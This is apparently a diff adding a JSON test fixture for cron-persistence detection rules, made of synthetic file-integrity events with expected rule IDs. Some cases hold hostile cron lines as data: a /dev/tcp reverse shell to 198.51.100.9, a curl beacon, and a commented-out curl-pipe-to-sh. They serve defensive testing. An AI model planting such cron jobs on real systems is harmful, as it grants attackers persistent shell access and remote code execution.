@@ -1,0 +1,327 @@
+{
+ "use_case": "UC18",
+ "cases": [
+  {
+   "id": "UC18-01",
+   "title": "/etc/crontab edited -> 111801",
+   "kind": "positive",
+   "events": [
+    {
+     "type": "fim",
+     "data": {
+      "path": "/etc/crontab",
+      "mode": "realtime",
+      "type": "modified",
+      "timestamp": 1762800000,
+      "attributes": {
+       "type": "file",
+       "size": 64,
+       "perm": "rw-r--r--",
+       "user_name": "root",
+       "group_name": "root",
+       "uid": "0",
+       "gid": "0",
+       "inode": 4242,
+       "mtime": 1762800000,
+       "hash_md5": "00000000000000000000000000000000",
+       "hash_sha1": "0000000000000000000000000000000000000000",
+       "hash_sha256": "0000000000000000000000000000000000000000000000000000000000000000",
+       "checksum": "0000000000000000000000000000000000000000"
+      },
+      "changed_attributes": [
+       "size",
+       "mtime",
+       "md5",
+       "sha1",
+       "sha256"
+      ],
+      "old_attributes": {
+       "type": "file",
+       "size": 60,
+       "perm": "rw-r--r--",
+       "user_name": "root",
+       "group_name": "root",
+       "uid": "0",
+       "gid": "0",
+       "inode": 4242,
+       "mtime": 1762790000,
+       "hash_md5": "11111111111111111111111111111111",
+       "hash_sha1": "1111111111111111111111111111111111111111",
+       "hash_sha256": "1111111111111111111111111111111111111111111111111111111111111111",
+       "checksum": "0000000000000000000000000000000000000000"
+      },
+      "content_changes": "22a23\n> 15 3 * * * root /usr/local/bin/backup.sh\n"
+     }
+    }
+   ],
+   "expect": [
+    {
+     "at": 1,
+     "rule": 111801
+    }
+   ],
+   "forbid": []
+  },
+  {
+   "id": "UC18-02",
+   "title": "New file in /etc/cron.d -> 111802",
+   "kind": "positive",
+   "events": [
+    {
+     "type": "fim",
+     "data": {
+      "path": "/etc/cron.d/pp-uc18-test",
+      "mode": "realtime",
+      "type": "added",
+      "timestamp": 1762800000,
+      "attributes": {
+       "type": "file",
+       "size": 64,
+       "perm": "rw-r--r--",
+       "user_name": "root",
+       "group_name": "root",
+       "uid": "0",
+       "gid": "0",
+       "inode": 4242,
+       "mtime": 1762800000,
+       "hash_md5": "00000000000000000000000000000000",
+       "hash_sha1": "0000000000000000000000000000000000000000",
+       "hash_sha256": "0000000000000000000000000000000000000000000000000000000000000000",
+       "checksum": "0000000000000000000000000000000000000000"
+      }
+     }
+    }
+   ],
+   "expect": [
+    {
+     "at": 1,
+     "rule": 111802
+    }
+   ],
+   "forbid": []
+  },
+  {
+   "id": "UC18-03",
+   "title": "Crontab created for www-data -> 111803",
+   "kind": "positive",
+   "events": [
+    {
+     "type": "fim",
+     "data": {
+      "path": "/var/spool/cron/crontabs/www-data",
+      "mode": "realtime",
+      "type": "added",
+      "timestamp": 1762800000,
+      "attributes": {
+       "type": "file",
+       "size": 64,
+       "perm": "rw-r--r--",
+       "user_name": "crontab",
+       "group_name": "crontab",
+       "uid": "33",
+       "gid": "33",
+       "inode": 4242,
+       "mtime": 1762800000,
+       "hash_md5": "00000000000000000000000000000000",
+       "hash_sha1": "0000000000000000000000000000000000000000",
+       "hash_sha256": "0000000000000000000000000000000000000000000000000000000000000000",
+       "checksum": "0000000000000000000000000000000000000000"
+      }
+     }
+    }
+   ],
+   "expect": [
+    {
+     "at": 1,
+     "rule": 111803
+    }
+   ],
+   "forbid": []
+  },
+  {
+   "id": "UC18-04",
+   "title": "cron.d job that downloads with curl -> 111804",
+   "kind": "positive",
+   "events": [
+    {
+     "type": "fim",
+     "data": {
+      "path": "/etc/cron.d/pp-uc18-test",
+      "mode": "realtime",
+      "type": "modified",
+      "timestamp": 1762800000,
+      "attributes": {
+       "type": "file",
+       "size": 64,
+       "perm": "rw-r--r--",
+       "user_name": "root",
+       "group_name": "root",
+       "uid": "0",
+       "gid": "0",
+       "inode": 4242,
+       "mtime": 1762800000,
+       "hash_md5": "00000000000000000000000000000000",
+       "hash_sha1": "0000000000000000000000000000000000000000",
+       "hash_sha256": "0000000000000000000000000000000000000000000000000000000000000000",
+       "checksum": "0000000000000000000000000000000000000000"
+      },
+      "changed_attributes": [
+       "size",
+       "mtime",
+       "md5",
+       "sha1",
+       "sha256"
+      ],
+      "old_attributes": {
+       "type": "file",
+       "size": 60,
+       "perm": "rw-r--r--",
+       "user_name": "root",
+       "group_name": "root",
+       "uid": "0",
+       "gid": "0",
+       "inode": 4242,
+       "mtime": 1762790000,
+       "hash_md5": "11111111111111111111111111111111",
+       "hash_sha1": "1111111111111111111111111111111111111111",
+       "hash_sha256": "1111111111111111111111111111111111111111111111111111111111111111",
+       "checksum": "0000000000000000000000000000000000000000"
+      },
+      "content_changes": "1a2\n> */30 * * * * root /usr/bin/curl -s http://198.51.100.9/ping -o /dev/null\n"
+     }
+    }
+   ],
+   "expect": [
+    {
+     "at": 1,
+     "rule": 111804
+    }
+   ],
+   "forbid": []
+  },
+  {
+   "id": "UC18-05",
+   "title": "www-data crontab gets a reverse-shell style job -> 111804",
+   "kind": "positive",
+   "events": [
+    {
+     "type": "fim",
+     "data": {
+      "path": "/var/spool/cron/crontabs/www-data",
+      "mode": "realtime",
+      "type": "modified",
+      "timestamp": 1762800000,
+      "attributes": {
+       "type": "file",
+       "size": 64,
+       "perm": "rw-r--r--",
+       "user_name": "crontab",
+       "group_name": "crontab",
+       "uid": "33",
+       "gid": "33",
+       "inode": 4242,
+       "mtime": 1762800000,
+       "hash_md5": "00000000000000000000000000000000",
+       "hash_sha1": "0000000000000000000000000000000000000000",
+       "hash_sha256": "0000000000000000000000000000000000000000000000000000000000000000",
+       "checksum": "0000000000000000000000000000000000000000"
+      },
+      "changed_attributes": [
+       "size",
+       "mtime",
+       "md5",
+       "sha1",
+       "sha256"
+      ],
+      "old_attributes": {
+       "type": "file",
+       "size": 60,
+       "perm": "rw-r--r--",
+       "user_name": "crontab",
+       "group_name": "crontab",
+       "uid": "33",
+       "gid": "33",
+       "inode": 4242,
+       "mtime": 1762790000,
+       "hash_md5": "11111111111111111111111111111111",
+       "hash_sha1": "1111111111111111111111111111111111111111",
+       "hash_sha256": "1111111111111111111111111111111111111111111111111111111111111111",
+       "checksum": "0000000000000000000000000000000000000000"
+      },
+      "content_changes": "3a4\n> * * * * * /bin/bash -c 'bash -i >& /dev/tcp/198.51.100.9/4444 0>&1'\n"
+     }
+    }
+   ],
+   "expect": [
+    {
+     "at": 1,
+     "rule": 111804
+    }
+   ],
+   "forbid": []
+  },
+  {
+   "id": "UC18-06",
+   "title": "Downloader line that is commented out stays at 111801 (FP control)",
+   "kind": "negative",
+   "events": [
+    {
+     "type": "fim",
+     "data": {
+      "path": "/etc/crontab",
+      "mode": "realtime",
+      "type": "modified",
+      "timestamp": 1762800000,
+      "attributes": {
+       "type": "file",
+       "size": 64,
+       "perm": "rw-r--r--",
+       "user_name": "root",
+       "group_name": "root",
+       "uid": "0",
+       "gid": "0",
+       "inode": 4242,
+       "mtime": 1762800000,
+       "hash_md5": "00000000000000000000000000000000",
+       "hash_sha1": "0000000000000000000000000000000000000000",
+       "hash_sha256": "0000000000000000000000000000000000000000000000000000000000000000",
+       "checksum": "0000000000000000000000000000000000000000"
+      },
+      "changed_attributes": [
+       "size",
+       "mtime",
+       "md5",
+       "sha1",
+       "sha256"
+      ],
+      "old_attributes": {
+       "type": "file",
+       "size": 60,
+       "perm": "rw-r--r--",
+       "user_name": "root",
+       "group_name": "root",
+       "uid": "0",
+       "gid": "0",
+       "inode": 4242,
+       "mtime": 1762790000,
+       "hash_md5": "11111111111111111111111111111111",
+       "hash_sha1": "1111111111111111111111111111111111111111",
+       "hash_sha256": "1111111111111111111111111111111111111111111111111111111111111111",
+       "checksum": "0000000000000000000000000000000000000000"
+      },
+      "content_changes": "22a23\n> # 0 * * * * root curl http://example.org | sh\n"
+     }
+    }
+   ],
+   "expect": [
+    {
+     "at": 1,
+     "rule": 111801
+    }
+   ],
+   "forbid": [
+    111804
+   ]
+  }
+ ]
+}
